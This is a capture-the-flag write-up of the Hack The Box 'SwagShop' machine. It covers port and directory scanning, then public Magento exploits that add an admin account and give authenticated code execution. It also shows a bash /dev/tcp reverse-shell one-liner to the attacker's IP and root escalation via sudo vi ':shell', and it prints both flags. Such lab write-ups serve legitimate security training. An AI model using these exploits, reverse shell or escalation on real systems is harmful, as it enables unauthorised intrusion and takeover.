# SWAGSHOP

## NMAP

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/swagshop]
└─$ nmap 10.10.10.140 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 06:59 EDT
Nmap scan report for 10.10.10.140
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 88.10 seconds
                                                                                    
┌──(kali㉿kali)-[~/Downloads/hackthebox/swagshop]
└─$ nmap 10.10.10.140 -p 22,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 07:00 EDT
Nmap scan report for 10.10.10.140
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.16 seconds
```

## PORT 80

### HOMEPAGE

![](https://github.com/Leo-2807/Writeups/blob/main/images/swagshop1.png)

### GOBUSTER

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/swagshop]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.140 -t 100 -x .txt,.jpg,.php -q
/.htpasswd.jpg        (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 296]
/.htpasswd.php        (Status: 403) [Size: 300]
/.htpasswd.txt        (Status: 403) [Size: 300]
/.htaccess.php        (Status: 403) [Size: 300]
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.hta.txt             (Status: 403) [Size: 295]
/.htaccess.txt        (Status: 403) [Size: 300]
/.hta.jpg             (Status: 403) [Size: 295]
/app                  (Status: 301) [Size: 310] [--> http://10.10.10.140/app/]
/.htaccess.jpg        (Status: 403) [Size: 300]                               
/.hta.php             (Status: 403) [Size: 295]                               
/api.php              (Status: 200) [Size: 37]                                
/cron.php             (Status: 200) [Size: 0]                                 
/errors               (Status: 301) [Size: 313] [--> http://10.10.10.140/errors/]
/favicon.ico          (Status: 200) [Size: 1150]                                 
/includes             (Status: 301) [Size: 315] [--> http://10.10.10.140/includes/]
/index.php            (Status: 302) [Size: 0] [--> http://swagshop.htb/]           
/install.php          (Status: 200) [Size: 44]                                     
/index.php            (Status: 302) [Size: 0] [--> http://swagshop.htb/]           
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.140/js/]      
/lib                  (Status: 301) [Size: 310] [--> http://10.10.10.140/lib/]     
/LICENSE.txt          (Status: 200) [Size: 10410]                                  
/media                (Status: 301) [Size: 312] [--> http://10.10.10.140/media/]   
/pkginfo              (Status: 301) [Size: 314] [--> http://10.10.10.140/pkginfo/] 
/server-status        (Status: 403) [Size: 300]                                    
/shell                (Status: 301) [Size: 312] [--> http://10.10.10.140/shell/]   
/skin                 (Status: 301) [Size: 311] [--> http://10.10.10.140/skin/]    
/var                  (Status: 301) [Size: 310] [--> http://10.10.10.140/var/]  
```

I checked through these pages but did not find anything useful 

## EXPLOIT

Doing a quick google search for exploits lead me to this [magento exploit](https://www.exploit-db.com/exploits/37977)


So there is a login page at ```/admin``` and the script will change the username and password so that we can login into it

### /ADMIN

![](https://github.com/Leo-2807/Writeups/blob/main/images/swagshop2.png)

After making some necessary changes to the script and setting the target ```target = "http://10.10.10.140/index.php"``` I ran the script 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/swagshop]
└─$ ./37977.py                                                                      
WORKED
Check http://10.10.10.140/index.php/admin with creds user:pass
```

### LOGIN

![](https://github.com/Leo-2807/Writeups/blob/main/images/swagshop3.png)

We find the magento version at the bottom of the page

### SHELL

Now we have the specific version of magento and also authentication

Using searchsploit 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/swagshop]
└─$ searchsploit magento 1.9.0.
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execut | php/webapps/37811.py
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execut | php/webapps/37811.py
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I download the exploit and after making some changes and resolving errors I run it

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/swagshop]
└─$ ./37811.py http://swagshop.htb/index.php/admin "id"                            
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Now that we have code execution we can get a shell

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/swagshop]
└─$ ./37811.py http://swagshop.htb/index.php/admin "bash -c 'bash -i >&/dev/tcp/10.10.14.3/4444 0>&1'"
```

## USER.TXT

```
www-data@swagshop:/var/www/html$ cd /home
cd /home
www-data@swagshop:/home$ ls
ls
haris
www-data@swagshop:/home$ cd haris
cd haris
www-data@swagshop:/home/haris$ ls
ls
user.txt
www-data@swagshop:/home/haris$ cat user.txt
cat user.txt
a448877277e82f05e5ddf9f90aefbac8
```

## ROOT.TXT

Using ```sudo -l``` to check sudo permissions of our user

```
www-data@swagshop:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

So we have permission to run vi
On searching at [gtfobins](https://gtfobins.github.io/) I found that we can create a shell by using ```:shell``` 

```
www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/index.php
:shell
whoami
root
cat /root/root.txt
c2b087d66e14a652a3b86a130ac56721

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
```

